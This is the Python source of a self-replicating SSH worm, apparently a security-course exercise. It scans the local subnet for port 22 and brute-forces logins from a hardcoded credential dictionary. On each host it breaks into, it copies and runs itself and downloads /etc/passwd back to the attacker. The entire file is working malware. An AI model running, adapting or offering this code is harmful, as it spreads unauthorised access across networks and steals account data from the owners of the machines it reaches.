import paramiko
import sys
import nmap
import socket
import os
import stat

 
# File marking the presence of a worm in a system
INFECTION_MARKER = "/tmp/infectionMarker_passW_python.txt"
 
 
# List of credentials for Dictionary Attack
DICTIONARYATTACK_LIST = {
        'crazy': 'things',
        'nsf': '456',
        'security': 'important',
        'ubuntu': '123456'
        }
 
#############################################
#Creates a marker file on the target system
#############################################
def markInfected():
    marker = open(INFECTION_MARKER, "w")
    marker.write("I have infected your system")
    marker.close()
 
 
#######################################################
#Checks if target system is infected
#@return - True if System is infected; False otherwise
#@param - sshC : Handle for ssh Connection
#######################################################
def isInfected(sshC):
    infected = False
 
    try:
        sftpClient = sshC.open_sftp()
        sftpClient.stat(INFECTION_MARKER)
        infected = True
         
    except IOError, e:
        print("This system is not Infected ")   
 
    return infected    
     
###########################################
#Returns IP of the current System
###########################################
def getMyIP():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('4.2.2.2', 80))
        return s.getsockname()[0]

 
##########################################################
#Scans the Network to check Live hosts on Port 22
#@return - a list of all IP addresses on the same network
###########################################################
def getHostsOnTheSameNetwork():
    portScanner = nmap.PortScanner()
    portScanner.scan('192.168.1.0/24', arguments = '-p 22 --open')
    hostInfo = portScanner.all_hosts()
    liveHosts = []
    for host in hostInfo:
        if portScanner[host].state() == "up":
            liveHosts.append(host)
    print("My IP is: "+ getMyIP())
    liveHosts.remove(getMyIP()) 
    return liveHosts
 

#################################################
# Password File Theif Worm:
# Steal Password:
#
#################################################

def stealPassword(ssh):
	sftpClient = ssh.open_sftp()
	os.chdir("/tmp/")
	print("started stealing password")	
	sftpClient.get("/etc/passwd","/tmp/passwd")
	print("Stole the password successfully!")

 
############################################
#Exploits the target system
##########################################
def exploitTarget(ssh):
    print("Expoiting Target System")
    sftpClient = ssh.open_sftp()
    try:
        sftpClient.put("/tmp/passwordthief_worm.py","/tmp/passwordthief_worm.py")
	print("put file")
        ssh.exec_command("chmod a+x /tmp/passwordthief_worm.py")
	print("chmod ")
        ssh.exec_command("nohup python -u /tmp/passwordthief_worm.py > /tmp/worm.output &")
	print("Infected this system sucessfully !! ;)")
	stealPassword(ssh)
    except:
        print("Failed to Execute worm")
	
 
 
##############################################
#Tries login with the Target System
#@param hostIP - IP of target system
#@param userName - the username
#@param passWord - the password
#@return - ssh
#############################################
def attackSystem(hostIP, userName, passWord):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostIP, username = userName, password = passWord)
    return ssh
 
 
#########################################################################
#Tries to find correct Credentails in the available Dictionary
#@param - hostIp - IP of a client is sent ot test if login is sucessful
#@return - return sshConnection handle if Successful Login else,
#returns False
#########################################################################
def checkCredentials(hostIp):
    ssh = False
     
    for k in DICTIONARYATTACK_LIST.keys():
        try:
            ssh = attackSystem(hostIp, k, DICTIONARYATTACK_LIST[k])
            if ssh:
                return ssh
        except:
            pass	
    print("Could not login to the system")
    return ssh




 
#################################################
#I start executing here - Replicator Worm
#################################################
 
print("Started infecting the network .....")
 
#Get all hosts in the network
discoveredHosts = getHostsOnTheSameNetwork()
markInfected()
 
 
for host in discoveredHosts:
    print(host + " under Observation ...")
    ssh = None
    try:
        ssh = checkCredentials(host)   
        if ssh:
            print("Successfully cracked Username and password of "+host)
            if not isInfected(ssh):
                exploitTarget(ssh)
                ssh.close()
		rename = "passwd_" + host
		print("renaming file passwd now...")
		os.rename("/tmp/passwd", rename)
		print("passwd renamed Successfully!")
                break
            else:
                print(host + " is already infected")
    except socket.error:
        print("System no longer Up !")
    except paramiko.ssh_exception.AuthenticationException:
        print("Wrong Credentials")
    print("---------------------")
 
print("I am done now !!")